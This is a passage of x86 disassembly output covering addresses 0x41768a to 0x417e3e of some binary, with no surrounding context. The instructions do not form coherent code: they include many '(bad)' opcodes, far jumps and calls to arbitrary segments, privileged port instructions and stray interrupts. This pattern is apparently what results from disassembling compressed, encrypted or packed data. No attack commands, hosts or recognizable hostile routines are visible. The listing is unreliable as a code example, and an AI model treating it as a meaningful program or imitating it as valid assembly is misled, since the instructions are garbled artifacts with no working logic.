  41768a:	xchg   edi,eax
  41768b:	cmps   BYTE PTR cs:[esi],BYTE PTR es:[edi]
  41768d:	test   al,0x79
  41768f:	das    
  417690:	push   ss
  417691:	scas   eax,DWORD PTR es:[edi]
  417692:	sbb    al,0xb1
  417694:	pop    ecx
  417695:	int    0x90
  417697:	push   0x4a018f1b
  41769c:	test   al,0x73
  41769e:	pop    eax
  41769f:	mov    eax,ss
  4176a1:	ror    DWORD PTR [ebx+0x5],0x43
  4176a5:	dec    esi
  4176a6:	dec    ebp
  4176a7:	popf   
  4176a8:	les    esi,FWORD PTR [edx-0xb269818]
  4176ae:	pop    edx
  4176af:	mov    edx,0x11cbd47c
  4176b4:	test   BYTE PTR [ebp-0x4],bl
  4176b7:	aad    0x6e
  4176b9:	xor    DWORD PTR [esi],ebx
  4176bb:	sub    cl,al
  4176bd:	or     esp,ebx
  4176bf:	inc    ebx
  4176c0:	out    dx,eax
  4176c1:	adc    DWORD PTR [edi+0x16],ecx
  4176c4:	shr    BYTE PTR [edx],cl
  4176c6:	lock scas al,BYTE PTR es:[edi]
  4176c8:	adc    BYTE PTR [edx],dl
  4176ca:	inc    esp
  4176cb:	jecxz  0x4176f3
  4176cd:	ja     0x4176dd
  4176cf:	enter  0x6e43,0x45
  4176d3:	and    eax,0xb9577f01
  4176d8:	xor    BYTE PTR ds:0xcbfb1d3f,cl
  4176de:	fild   WORD PTR [ebx-0x3f]
  4176e1:	jmp    0xcfa2:0xa7799a1e
  4176e8:	cld    
  4176e9:	mov    cl,0x64
  4176eb:	mov    ds:0x14acc4f,al
  4176f0:	fs jo  0x417738
  4176f3:	retf   0xcf9f
  4176f6:	pop    esi
  4176f7:	stos   DWORD PTR es:[edi],eax
  4176f8:	scas   eax,DWORD PTR es:[edi]
  4176f9:	stos   DWORD PTR es:[edi],eax
  4176fa:	adc    al,0x65
  4176fc:	fiadd  WORD PTR [eax-0x7f]
  4176ff:	dec    edi
  417700:	cmp    eax,0x806bbc6b
  417705:	sub    BYTE PTR [ebp-0x5386397a],al
  41770b:	xor    DWORD PTR [esi],edx
  41770d:	cdq    
  41770e:	aam    0x9a
  417710:	(bad)  
  417711:	jg     0x4176a4
  417713:	adc    BYTE PTR [ecx],cl
  417715:	add    al,0x32
  417717:	mov    al,0x32
  417719:	pop    ds
  41771a:	aad    0x9
  41771c:	fstp   TBYTE PTR [ecx+0x4]
  41771f:	enter  0xf5a1,0xdc
  417723:	lods   eax,DWORD PTR ds:[esi]
  417724:	popa   
  417725:	mov    ch,0x8a
  417727:	sub    eax,0x22d25b8c
  41772c:	dec    esp
  41772d:	inc    esi
  41772e:	pop    ecx
  41772f:	push   ebx
  417730:	aas    
  417731:	jne    0x41774b
  417733:	fdivr  st,st(5)
  417735:	mov    eax,ds:0xffb61eb2
  41773a:	adc    BYTE PTR [ecx],cl
  41773c:	sbb    eax,0x336861b3
  417741:	push   edx
  417742:	(bad)  
  417743:	xchg   esp,eax
  417744:	test   DWORD PTR [ecx+0x79498263],0x315c4478
  41774e:	pop    es
  41774f:	adc    ecx,esp
  417751:	push   fs
  417753:	aaa    
  417754:	icebp  
  417755:	test   eax,0xd795c4fa
  41775a:	xor    al,0xae
  41775c:	jae    0x417759
  41775e:	imul   ebp,DWORD PTR [edi-0x17],0x7
  417762:	(bad)  
  417763:	(bad)  
  417764:	in     eax,0x11
  417766:	in     al,dx
  417767:	push   cs
  417768:	and    dl,dl
  41776a:	cmp    cl,0x62
  41776d:	mov    ebx,DWORD PTR [edx-0x3e]
  417770:	mov    edi,0xbb8330db
  417775:	imul   ebx,DWORD PTR [ebx],0x5cf2bd9d
  41777b:	jmp    0xb458:0x76dc2a10
  417782:	fcom   QWORD PTR fs:[eax-0x4cb23c85]
  417789:	neg    BYTE PTR [esi]
  41778b:	mov    eax,0x740cf7cb
  417790:	cwde   
  417791:	push   0x3d2cffde
  417796:	sub    al,0x85
  417798:	cld    
  417799:	je     0x41775e
  41779b:	outs   dx,BYTE PTR ds:[esi]
  41779c:	test   eax,0xcca6f181
  4177a1:	adc    BYTE PTR [edi],ah
  4177a3:	or     edx,ebx
  4177a5:	in     al,0xd2
  4177a7:	fsubr  DWORD PTR [ecx]
  4177a9:	or     al,0x6b
  4177ab:	jg     0x4177ba
  4177ad:	push   0x1a
  4177af:	scas   eax,DWORD PTR es:[edi]
  4177b0:	loopne 0x4177a3
  4177b2:	ret    0x1009
  4177b5:	imul   edi,DWORD PTR [esp+eax*2+0x79],0xb80c15e
  4177bd:	sub    BYTE PTR [esi-0x73b3d6ce],0xc1
  4177c4:	into   
  4177c5:	jge    0x417826
  4177c7:	push   esi
  4177c8:	call   0xa9bb:0x5651b87d
  4177cf:	(bad)  
  4177d1:	mov    esi,0x71befae0
  4177d6:	scas   eax,DWORD PTR es:[edi]
  4177d7:	mov    BYTE PTR ds:0xf6516164,ch
  4177dd:	ret    
  4177de:	dec    esp
  4177df:	add    DWORD PTR [eax-0x503102cf],esp
  4177e5:	mov    bh,0xae
  4177e7:	rol    dl,1
  4177e9:	add    DWORD PTR [edi+0x3d],edi
  4177ec:	(bad)  
  4177ed:	fistp  QWORD PTR [ecx-0x71]
  4177f0:	pop    ss
  4177f1:	or     ah,dh
  4177f3:	icebp  
  4177f4:	xor    ecx,ebp
  4177f6:	cli    
  4177f7:	cmp    ch,cl
  4177f9:	stos   DWORD PTR es:[edi],eax
  4177fa:	xchg   ebx,eax
  4177fb:	dec    edx
  4177fc:	xor    edx,DWORD PTR [eax-0x1f]
  4177ff:	das    
  417800:	jl     0x417865
  417802:	je     0x417875
  417804:	daa    
  417805:	fdivrp st(7),st
  417807:	pop    esi
  417808:	xor    eax,0xcba9dbe5
  41780d:	into   
  41780e:	stc    
  41780f:	scas   al,BYTE PTR es:[edi]
  417810:	loop   0x41783f
  417812:	jno    0x4177bf
  417814:	xor    eax,0x23be2310
  417819:	mov    edx,0xa50ec59b
  41781e:	mov    bh,0x8a
  417820:	(bad)  
  417821:	popf   
  417822:	push   eax
  417823:	mov    eax,0x580fae35
  417828:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417829:	cmc    
  41782a:	into   
  41782b:	int    0x6d
  41782d:	ins    DWORD PTR es:[edi],dx
  41782e:	lods   al,BYTE PTR ds:[esi]
  41782f:	mov    dl,0xe8
  417831:	arpl   WORD PTR [ebx+0x7ff41c12],dx
  417837:	ror    al,0x27
  41783a:	adc    dl,al
  41783c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41783d:	gs adc dh,ah
  417840:	test   eax,0x99e4a4ce
  417845:	and    al,0xda
  417847:	leave  
  417848:	shr    BYTE PTR [esi+0x22],cl
  41784b:	aam    0xb
  41784d:	mov    ch,0x31
  41784f:	push   0xb6f20741
  417854:	jmp    0x942a:0x2dac5a59
  41785b:	je     0x417805
  41785d:	jmp    0x41784f
  41785f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417860:	xchg   edi,eax
  417861:	xlat   BYTE PTR ds:[ebx]
  417862:	mov    esp,ecx
  417864:	push   eax
  417865:	xor    al,0x57
  417867:	xor    BYTE PTR [esi+0xb6de01f],cl
  41786d:	(bad)  
  41786f:	add    al,0xeb
  417871:	loope  0x4178e4
  417873:	dec    edi
  417874:	xchg   edi,eax
  417875:	dec    ebp
  417876:	sti    
  417877:	jb     0x41784c
  417879:	cmp    esp,ecx
  41787b:	sub    eax,DWORD PTR [ecx-0x7f9b3a3d]
  417881:	xchg   esi,eax
  417882:	and    DWORD PTR [esi],esi
  417884:	xor    eax,0xbff5d1fd
  417889:	ror    DWORD PTR [edi-0x4f],1
  41788c:	or     al,0xf
  41788e:	fbstp  TBYTE PTR [eax-0x66262ce6]
  417894:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417895:	add    ah,BYTE PTR [edx+0x5e]
  417898:	pop    edi
  417899:	gs repnz mov ecx,0xc80d7752
  4178a0:	fmul   st,st(3)
  4178a2:	sub    al,0x14
  4178a4:	aad    0x6
  4178a6:	neg    DWORD PTR [ebx-0x255e384b]
  4178ac:	mov    eax,ds:0x6f7bf96f
  4178b1:	inc    esi
  4178b2:	in     al,dx
  4178b3:	jno    0x41788e
  4178b5:	xchg   BYTE PTR [eax-0x10],al
  4178b8:	pop    es
  4178b9:	rol    cl,0x81
  4178bc:	mov    esp,0x71681854
  4178c1:	inc    esi
  4178c2:	pop    ds
  4178c3:	inc    esp
  4178c4:	cmp    DWORD PTR [esi-0x3e9078a4],0x6bab309e
  4178ce:	mov    ebp,0xc9fcf5bf
  4178d3:	sti    
  4178d4:	adc    ebx,DWORD PTR [ebx+0x74fdb983]
  4178da:	sub    DWORD PTR [esi],edx
  4178dc:	jae    0x41788c
  4178de:	adc    BYTE PTR [edx-0x1f7fa128],ch
  4178e4:	sub    al,0xa3
  4178e6:	int3   
  4178e7:	outs   dx,DWORD PTR ds:[esi]
  4178e8:	sbb    eax,0xde8bcc3c
  4178ed:	or     eax,0x6773c09f
  4178f2:	fdiv   DWORD PTR [ecx+ebp*2+0x1abee0f6]
  4178f9:	sar    BYTE PTR [bp+di+0x6a],1
  4178fd:	rcr    BYTE PTR [ebp-0x5d],cl
  417900:	aaa    
  417901:	shl    BYTE PTR [ecx],1
  417903:	mov    dl,0x4b
  417905:	retf   
  417906:	stos   BYTE PTR es:[edi],al
  417907:	(bad)  
  417908:	ins    DWORD PTR es:[edi],dx
  417909:	loopne 0x4178b6
  41790b:	loop   0x41797a
  41790d:	inc    edi
  41790e:	in     eax,0x94
  417910:	mov    eax,ds:0x27c661ae
  417915:	not    esp
  417917:	pop    esp
  417918:	mov    WORD PTR [ebp+0x1a],?
  41791b:	jmp    0x32b7:0x5b096736
  417922:	adc    ebp,edx
  417924:	stc    
  417925:	dec    ecx
  417926:	and    BYTE PTR [edi+0x344a751d],cl
  41792c:	jmp    0xd675:0xef7e896e
  417933:	adc    DWORD PTR [eax],edx
  417935:	push   ds
  417936:	in     eax,dx
  417937:	push   edi
  417938:	mov    ds:0xb8bba6ae,al
  41793d:	(bad)  
  41793e:	syscall 
  417940:	pop    eax
  417941:	and    ch,dl
  417943:	adc    eax,0xbfac44be
  417948:	pop    ebp
  417949:	jle    0x41794f
  41794b:	in     al,0x22
  41794d:	fbld   TBYTE PTR cs:[eax+0x58]
  417951:	jae    0x417934
  417953:	cli    
  417954:	jae    0x4179bb
  417956:	jmp    0x4364a15
  41795b:	cmc    
  41795c:	lahf   
  41795d:	(bad)  
  41795e:	hlt    
  41795f:	mov    ds:0x5c07b572,eax
  417964:	adc    ecx,ecx
  417966:	sbb    BYTE PTR [edi+0x40],0xd9
  41796a:	mov    al,ds:0x2ae0de4a
  41796f:	aad    0xe2
  417971:	in     eax,dx
  417972:	outs   dx,BYTE PTR ds:[esi]
  417973:	out    0x41,al
  417975:	dec    eax
  417976:	shr    BYTE PTR [esp+edi*2-0x24],cl
  41797a:	mov    WORD PTR [ecx+0x53902882],fs
  417980:	js     0x417986
  417982:	sahf   
  417983:	inc    esi
  417984:	add    eax,0x9ff5a53f
  417989:	mov    edi,0x604ddad
  41798e:	jnp    0x41797c
  417990:	int    0xbf
  417992:	jo     0x417a0e
  417994:	xchg   ecx,eax
  417995:	stos   DWORD PTR es:[edi],eax
  417996:	retf   
  417997:	out    0xd7,al
  417999:	sbb    dl,dh
  41799b:	std    
  41799c:	mov    ch,0x14
  41799e:	aam    0xca
  4179a0:	test   al,0xdb
  4179a2:	pop    ds
  4179a3:	mov    dh,0x1c
  4179a5:	mov    edx,0x104ccb0c
  4179aa:	xchg   ecx,eax
  4179ab:	or     eax,0x8d0fe3f
  4179b0:	sahf   
  4179b1:	dec    ebp
  4179b2:	jl     0x417a04
  4179b4:	cmp    eax,0x8493c0b1
  4179b9:	cwde   
  4179ba:	dec    esi
  4179bb:	sbb    DWORD PTR [edx-0x7],edx
  4179be:	test   eax,0xa9addd92
  4179c3:	sahf   
  4179c4:	or     BYTE PTR [esi],ah
  4179c6:	ficomp DWORD PTR [ecx]
  4179c8:	pushf  
  4179c9:	xchg   esi,eax
  4179ca:	adc    edx,DWORD PTR [edi+0x48]
  4179cd:	out    0x3d,al
  4179cf:	out    dx,eax
  4179d0:	mov    edx,0x9d690e34
  4179d5:	fmul   st,st(1)
  4179d7:	iret   
  4179d8:	mov    ecx,DWORD PTR ds:0xd257c61f
  4179de:	fstp   QWORD PTR [ebx]
  4179e0:	(bad)  
  4179e1:	pop    ds
  4179e2:	jg     0x417a09
  4179e4:	adc    DWORD PTR [edx-0x30],ecx
  4179e7:	sbb    bl,BYTE PTR [esi-0x6e]
  4179ea:	ja     0x4179ef
  4179ec:	dec    ecx
  4179ed:	outs   dx,BYTE PTR ds:[esi]
  4179ee:	ror    DWORD PTR [ebx+0x6e],cl
  4179f1:	push   0xfffffff2
  4179f3:	call   0x95ee:0x77a7c1d1
  4179fa:	fwait
  4179fb:	adc    DWORD PTR [esi+0x26],0xfffffff8
  4179ff:	arpl   bx,di
  417a01:	adc    al,0x6d
  417a03:	push   es
  417a04:	or     ecx,edx
  417a06:	fwait
  417a07:	outs   dx,BYTE PTR ds:[esi]
  417a08:	dec    esp
  417a09:	jae    0x417a8a
  417a0b:	mov    edx,0xc27c9803
  417a10:	bound  ebx,QWORD PTR [eax]
  417a12:	and    al,0x8a
  417a14:	xor    al,0x1
  417a16:	cmc    
  417a17:	dec    ecx
  417a18:	pop    eax
  417a19:	xchg   esp,eax
  417a1a:	out    dx,eax
  417a1b:	in     eax,0x3e
  417a1d:	mov    dl,0x4c
  417a1f:	pop    eax
  417a20:	push   ecx
  417a21:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417a22:	aaa    
  417a23:	(bad)  
  417a24:	jl     0x417a31
  417a26:	arpl   WORD PTR [esi+0x4cceb996],cx
  417a2c:	sar    BYTE PTR [eax-0x5e],cl
  417a2f:	cs pop ebx
  417a31:	nop
  417a32:	scas   al,BYTE PTR es:[edi]
  417a33:	(bad)  
  417a34:	repz and ch,cl
  417a37:	lds    ebp,FWORD PTR [ebx]
  417a39:	add    ecx,esi
  417a3b:	bound  ecx,QWORD PTR ds:0xd5ec0c45
  417a41:	fld    DWORD PTR [eax+esi*2]
  417a44:	out    0x5c,eax
  417a46:	popf   
  417a47:	mov    al,BYTE PTR [eax+0x1360d7f3]
  417a4d:	sbb    al,dl
  417a4f:	add    BYTE PTR [ebx+eiz*2],bl
  417a52:	mov    al,ds:0x1bceb87a
  417a57:	add    BYTE PTR [ecx+ebp*8-0x4f5c2015],ah
  417a5e:	inc    edx
  417a5f:	sub    BYTE PTR [ebx+0x38354a2e],bh
  417a65:	pusha  
  417a66:	ss je  0x417a8a
  417a69:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417a6a:	mov    ch,0x2f
  417a6c:	push   esi
  417a6d:	and    ebp,ecx
  417a6f:	retf   0xb676
  417a72:	jp     0x417ae7
  417a74:	push   esi
  417a75:	push   ebx
  417a76:	mov    edi,0xd1b7c6fa
  417a7b:	out    0xc7,eax
  417a7d:	retf   
  417a7e:	out    dx,eax
  417a7f:	pop    ecx
  417a80:	mov    dl,0x71
  417a82:	sahf   
  417a83:	jg     0x417ae3
  417a85:	push   es
  417a86:	adc    eax,DWORD PTR [ecx]
  417a88:	push   edx
  417a89:	das    
  417a8a:	dec    ecx
  417a8b:	scas   eax,DWORD PTR es:[edi]
  417a8c:	popf   
  417a8d:	stos   DWORD PTR es:[edi],eax
  417a8e:	sub    DWORD PTR [esi-0x4625396a],esp
  417a94:	pop    ds
  417a95:	loopne 0x417a9e
  417a97:	cmc    
  417a98:	test   eax,0xee70a453
  417a9d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417a9e:	push   eax
  417a9f:	call   0xf6b67103
  417aa4:	xor    dh,BYTE PTR [ecx]
  417aa6:	mov    BYTE PTR [eax-0x30],bl
  417aa9:	stc    
  417aaa:	mov    ds:0x2f412874,al
  417aaf:	ins    DWORD PTR es:[edi],dx
  417ab0:	(bad)  
  417ab1:	into   
  417ab2:	mov    edx,0xcc1894d0
  417ab7:	icebp  
  417ab8:	mov    ds:0x2b293d58,eax
  417abd:	ret    
  417abe:	popf   
  417abf:	(bad)  
  417ac0:	cmp    BYTE PTR [ebx-0x35],0x5c
  417ac4:	into   
  417ac5:	jle    0x417a5c
  417ac7:	pop    ecx
  417ac8:	adc    al,0xc1
  417aca:	mov    ah,0xc
  417acc:	sbb    eax,0x9fdfc2e4
  417ad1:	ins    BYTE PTR es:[edi],dx
  417ad2:	aam    0xd3
  417ad4:	xchg   ebp,eax
  417ad5:	test   BYTE PTR [ebx],bh
  417ad7:	jns    0x417ad6
  417ad9:	cmp    eax,0x8d73aa89
  417ade:	in     al,0xd3
  417ae0:	adc    edx,ebp
  417ae2:	jnp    0x417b2a
  417ae4:	adc    DWORD PTR [esi],edi
  417ae6:	mov    ebx,0xef4a198a
  417aeb:	adc    eax,DWORD PTR [eax-0x26f08768]
  417af1:	mov    ds,ebp
  417af3:	out    dx,eax
  417af4:	adc    eax,0x43f7361
  417af9:	pop    ebp
  417afa:	sahf   
  417afb:	xor    DWORD PTR ds:0xae224cce,edx
  417b01:	pop    ds
  417b02:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417b03:	int    0x55
  417b05:	stos   DWORD PTR es:[edi],eax
  417b06:	leave  
  417b07:	aad    0xf
  417b09:	adc    al,BYTE PTR [eax+edx*2-0x4dc63cb5]
  417b10:	sub    BYTE PTR [ebp+0x26],0x17
  417b14:	cmp    BYTE PTR [esi-0x35b092f1],dh
  417b1a:	jp     0x417ac4
  417b1c:	loopne 0x417b9c
  417b1e:	xchg   BYTE PTR [ebp+esi*1-0x21],bl
  417b22:	inc    esp
  417b23:	int3   
  417b24:	cdq    
  417b25:	cmp    BYTE PTR [edx-0x26c9c626],ah
  417b2b:	mov    dl,bl
  417b2d:	and    DWORD PTR [eax-0x6d84b524],0xffffff87
  417b34:	xchg   ecx,eax
  417b35:	test   eax,0x8473d19f
  417b3a:	les    ebx,FWORD PTR [ecx+0x79c3034d]
  417b40:	mov    ebp,0x73dbb16e
  417b45:	pavgw  mm3,QWORD PTR [esi*8+0x2ae72df6]
  417b4d:	dec    ebx
  417b4e:	push   es
  417b4f:	sub    dl,BYTE PTR [ebx]
  417b51:	out    dx,eax
  417b52:	shl    BYTE PTR [ebx+eiz*4],1
  417b55:	mov    eax,0x453cb9ec
  417b5a:	sub    al,0x97
  417b5c:	adc    ah,cl
  417b5e:	cmc    
  417b5f:	icebp  
  417b60:	cmc    
  417b61:	mov    al,ds:0x52ae18d5
  417b66:	xor    bl,BYTE PTR [edi]
  417b68:	xchg   ebp,eax
  417b69:	ins    DWORD PTR es:[edi],dx
  417b6a:	cmp    al,ch
  417b6c:	xor    ah,0x24
  417b6f:	mov    edx,edx
  417b71:	xchg   ecx,eax
  417b72:	add    DWORD PTR [ecx-0xd58275a],0x9
  417b79:	imul   esp,DWORD PTR [edi+0x1420073b],0x7de553ab
  417b83:	sar    DWORD PTR [eax-0x25],1
  417b86:	mov    al,ds:0x638d55dc
  417b8b:	mov    ss,WORD PTR [ebx-0x7d75e729]
  417b91:	add    eax,0xea71eaba
  417b96:	lea    edi,[ecx]
  417b98:	enter  0xed48,0xca
  417b9c:	adc    al,0x98
  417b9e:	test   al,0x41
  417ba0:	sbb    DWORD PTR [eax],edi
  417ba2:	jb     0x417b85
  417ba4:	pop    esp
  417ba5:	xchg   edx,eax
  417ba6:	outs   dx,DWORD PTR ds:[esi]
  417ba7:	imul   esi,DWORD PTR [esi],0xcb0ea6a3
  417bad:	inc    ebx
  417bae:	ja     0x417bf2
  417bb0:	test   eax,esi
  417bb2:	ins    DWORD PTR es:[edi],dx
  417bb3:	add    edi,ecx
  417bb5:	popf   
  417bb6:	lds    ebx,FWORD PTR [ebp+0x1e]
  417bb9:	ret    0x84b7
  417bbc:	sub    BYTE PTR [edx+esi*4-0x50],0x14
  417bc1:	pop    esi
  417bc2:	mov    ch,0x86
  417bc4:	ror    DWORD PTR [ebx-0x53],1
  417bc7:	jae    0x417c42
  417bc9:	mov    bl,0x9e
  417bcb:	dec    ebx
  417bcc:	pop    ebx
  417bcd:	shl    DWORD PTR [ecx-0x3b],0x13
  417bd1:	adc    dl,BYTE PTR [ecx]
  417bd3:	xchg   BYTE PTR cs:[esi-0xf],cl
  417bd7:	cmp    eax,0xddb9f007
  417bdc:	ja     0x417b66
  417bde:	mov    DWORD PTR [eax-0x591bd1dd],ebx
  417be4:	push   esi
  417be5:	popa   
  417be6:	push   edi
  417be7:	sub    ch,BYTE PTR [ebx-0x59]
  417bea:	out    dx,al
  417beb:	push   ds
  417bec:	dec    esi
  417bed:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417bee:	add    DWORD PTR [ebx],edi
  417bf0:	ja     0x417bb1
  417bf2:	adc    edi,DWORD PTR [ecx]
  417bf4:	enter  0xf2a9,0x39
  417bf8:	mov    esi,0x1806b80c
  417bfd:	lods   al,BYTE PTR ds:[esi]
  417bfe:	adc    eax,0x6c61f6ff
  417c03:	dec    eax
  417c04:	mov    ebp,0x204bf855
  417c09:	imul   eax,DWORD PTR [edi-0x2b],0xc055e8fb
  417c10:	sbb    BYTE PTR [edi-0x78fc5d29],bh
  417c16:	repnz dec edx
  417c18:	pusha  
  417c19:	jno    0x417c67
  417c1b:	jmp    0x417c1b
  417c1d:	outs   dx,BYTE PTR ds:[esi]
  417c1e:	cmp    bl,BYTE PTR [edx+0x3fcca68c]
  417c24:	call   0x1d2d:0xc54c886d
  417c2b:	sbb    eax,0x93cc72af
  417c30:	adc    al,0x9a
  417c32:	or     bl,al
  417c34:	push   ebp
  417c35:	loope  0x417c65
  417c37:	adc    BYTE PTR [edi],cl
  417c39:	push   eax
  417c3a:	and    BYTE PTR [edi],0x24
  417c3d:	push   ebp
  417c3e:	pop    ecx
  417c3f:	cs enter 0x1168,0x84
  417c44:	imul   edx,esp,0x3b81b5de
  417c4a:	dec    ecx
  417c4b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417c4c:	mov    esi,0xcde05928
  417c51:	fs pop ebp
  417c53:	ja     0x417bec
  417c55:	inc    eax
  417c56:	dec    edx
  417c57:	clc    
  417c58:	xchg   edx,eax
  417c59:	xchg   ebp,eax
  417c5a:	in     al,0x42
  417c5c:	xlat   BYTE PTR ds:[ebx]
  417c5d:	jnp    0x417c9f
  417c5f:	jns    0x417ccd
  417c61:	xor    eax,0x8dcbd145
  417c66:	xchg   ebp,eax
  417c67:	mov    bl,0x91
  417c69:	inc    eax
  417c6a:	dec    eax
  417c6b:	and    esi,esp
  417c6d:	pop    esp
  417c6e:	and    DWORD PTR [eax],edx
  417c70:	cdq    
  417c71:	lds    eax,FWORD PTR [ecx-0x70]
  417c74:	dec    esi
  417c75:	mov    ebx,0x8ed0a234
  417c7a:	mov    edi,0x6c76726f
  417c7f:	sub    DWORD PTR [edx],esp
  417c81:	add    ebp,eax
  417c83:	test   DWORD PTR [edx-0x5c664a33],eax
  417c89:	in     eax,0x75
  417c8b:	mov    dl,0x50
  417c8d:	rcl    DWORD PTR [ebx+0x10],cl
  417c90:	rol    BYTE PTR [edx+0x3b2a09bc],0xe6
  417c97:	mov    ds:0xa3ccd403,eax
  417c9c:	mov    edx,0xc54cb7a9
  417ca1:	(bad)  
  417ca3:	imul   ecx,DWORD PTR [ecx],0x18
  417ca6:	out    dx,al
  417ca7:	mov    cl,0xf6
  417ca9:	dec    ebx
  417caa:	aas    
  417cab:	test   al,0x4e
  417cad:	(bad)  
  417cae:	dec    ebx
  417caf:	and    edi,DWORD PTR [ebx]
  417cb1:	gs lock daa 
  417cb4:	shl    BYTE PTR [esi],cl
  417cb6:	sbb    ebp,DWORD PTR [ebp+0x1c1f91ea]
  417cbc:	sbb    esi,esi
  417cbe:	outs   dx,BYTE PTR ds:[esi]
  417cbf:	es sub al,0x86
  417cc2:	pop    eax
  417cc3:	xchg   ebx,eax
  417cc4:	cli    
  417cc5:	mov    BYTE PTR [edx+0x204e690b],ah
  417ccb:	repnz (bad) 
  417ccd:	jmp    0xffba:0x6e435166
  417cd4:	imul   esp,DWORD PTR [esi+0x6c],0x64
  417cd8:	mov    ebp,0x104c6053
  417cdd:	jbe    0x417c9a
  417cdf:	out    0x8c,eax
  417ce1:	jp     0x417cb0
  417ce3:	sub    bh,dh
  417ce5:	repnz dec edi
  417ce7:	pop    esp
  417ce8:	lods   al,BYTE PTR ds:[esi]
  417ce9:	fidivr WORD PTR [edi]
  417ceb:	lahf   
  417cec:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417ced:	ss loop 0x417c7f
  417cf0:	lods   eax,DWORD PTR ds:[esi]
  417cf1:	mov    edi,0xf83bc74
  417cf6:	mov    dl,0x81
  417cf8:	jmp    0x7cedb18b
  417cfd:	jmp    0xc2449fc0
  417d02:	pop    edi
  417d03:	les    ecx,FWORD PTR [esi]
  417d05:	jp     0x417cba
  417d07:	ror    BYTE PTR [edi+esi*2+0xa],1
  417d0b:	push   eax
  417d0c:	scas   al,BYTE PTR es:[edi]
  417d0d:	mov    ch,0x9d
  417d0f:	call   0x7ff4:0x2cb0434a
  417d16:	stos   BYTE PTR es:[edi],al
  417d17:	xor    eax,0x5098c18d
  417d1c:	sub    al,0x29
  417d1e:	add    al,0x40
  417d20:	mov    ebp,0x45839911
  417d25:	lds    esp,FWORD PTR [ecx-0x56]
  417d28:	inc    ecx
  417d29:	dec    ebp
  417d2a:	mov    dl,0x2d
  417d2c:	xchg   esp,eax
  417d2d:	push   ebp
  417d2e:	add    al,0x4f
  417d30:	dec    esi
  417d32:	jecxz  0x417d51
  417d34:	inc    esp
  417d35:	cld    
  417d36:	mov    ds:0xc78a5ee9,eax
  417d3b:	cs push cs
  417d3d:	cmp    DWORD PTR [esp+eiz*2-0xf],esp
  417d41:	scas   eax,DWORD PTR es:[edi]
  417d42:	(bad)  
  417d43:	push   0x9
  417d45:	fcom   st(3)
  417d47:	jne    0x417dc8
  417d49:	clc    
  417d4a:	aam    0xf9
  417d4c:	jnp    0x417cd6
  417d4e:	int3   
  417d4f:	sbb    ah,BYTE PTR [ecx]
  417d51:	mov    bh,0x39
  417d53:	fidivr WORD PTR [edx+0x29]
  417d56:	pusha  
  417d57:	in     eax,dx
  417d58:	add    dl,bl
  417d5a:	aam    0xe9
  417d5c:	push   esi
  417d5d:	jno    0x417d70
  417d5f:	arpl   WORD PTR [ebx+0x33994673],ax
  417d65:	pop    ebx
  417d66:	mov    ecx,0x946385c8
  417d6b:	stc    
  417d6c:	ins    BYTE PTR es:[edi],dx
  417d6d:	call   0x7f8d:0x89179a4d
  417d74:	pop    ds
  417d75:	cmp    DWORD PTR ds:0x8b07c00c,esp
  417d7b:	test   eax,0x8f019fa9
  417d80:	call   0x3b384b5
  417d85:	out    0x2,eax
  417d87:	mov    ch,0x1d
  417d89:	test   BYTE PTR [ebx-0xb],bl
  417d8c:	inc    edx
  417d8d:	adc    DWORD PTR [ecx+0x7acf54cc],edx
  417d93:	cmp    dl,BYTE PTR [edx+0x38b9dfed]
  417d99:	int    0x1c
  417d9b:	std    
  417d9c:	mov    ebp,0x66e96746
  417da1:	inc    ecx
  417da2:	jmp    0x5dc9883f
  417da7:	mov    ah,0xb7
  417da9:	jne    0x417dac
  417dab:	sub    eax,0xa401846a
  417db0:	icebp  
  417db1:	ds fwait
  417db3:	repz xchg esi,eax
  417db5:	scas   al,BYTE PTR es:[edi]
  417db6:	mov    ds:0x9f0b9b0c,eax
  417dbb:	out    dx,eax
  417dbc:	sti    
  417dbd:	pop    esi
  417dbe:	add    ah,BYTE PTR [ebx+0x3ff7073c]
  417dc4:	sahf   
  417dc5:	push   ss
  417dc6:	adc    DWORD PTR [esi+ebp*8-0x45],edi
  417dca:	fwait
  417dcb:	cwde   
  417dcc:	je     0x417dcd
  417dce:	aam    0x21
  417dd0:	dec    edi
  417dd1:	dec    BYTE PTR [esi-0x15]
  417dd4:	repz add eax,0xdc6622b6
  417dda:	fwait
  417ddb:	fwait
  417ddc:	in     eax,dx
  417ddd:	push   0x75
  417ddf:	pop    ds
  417de0:	ret    0xacef
  417de3:	arpl   WORD PTR [eax+0x1d7ecab7],di
  417de9:	jp     0x417e07
  417deb:	xchg   BYTE PTR [ecx+0x6f],bl
  417dee:	repnz pop ebp
  417df0:	popa   
  417df1:	idiv   eax
  417df3:	out    0xe5,al
  417df5:	call   DWORD PTR [edi]
  417df7:	pop    eax
  417df8:	push   ebp
  417df9:	inc    esp
  417dfa:	xlat   BYTE PTR ds:[ebx]
  417dfb:	test   BYTE PTR [ebx+0x17],ch
  417dfe:	das    
  417dff:	out    0x7d,eax
  417e01:	int3   
  417e02:	cmp    eax,0x75e2f234
  417e07:	sbb    edx,DWORD PTR [esi+0xd]
  417e0a:	ss aad 0x36
  417e0d:	xor    al,dh
  417e0f:	ins    BYTE PTR es:[edi],dx
  417e10:	add    eax,0x17514b1b
  417e15:	in     eax,0x49
  417e17:	adc    BYTE PTR [esp+eax*1+0x4c8f1fba],cl
  417e1e:	inc    ecx
  417e1f:	jb     0x417e86
  417e21:	dec    esi
  417e22:	mov    esi,0x33700019
  417e27:	xchg   edx,eax
  417e28:	mov    al,0x90
  417e2a:	test   eax,0x649d2029
  417e2f:	add    eax,0xd1af0d1e
  417e34:	fcomp  DWORD PTR [ecx]
  417e36:	(bad)  
  417e37:	ins    DWORD PTR es:[edi],dx
  417e38:	or     dh,bh
  417e3a:	dec    ecx
  417e3b:	mov    edx,DWORD PTR [edi+0x57]
  417e3e:	lods   al,BYTE PTR ds:[esi]
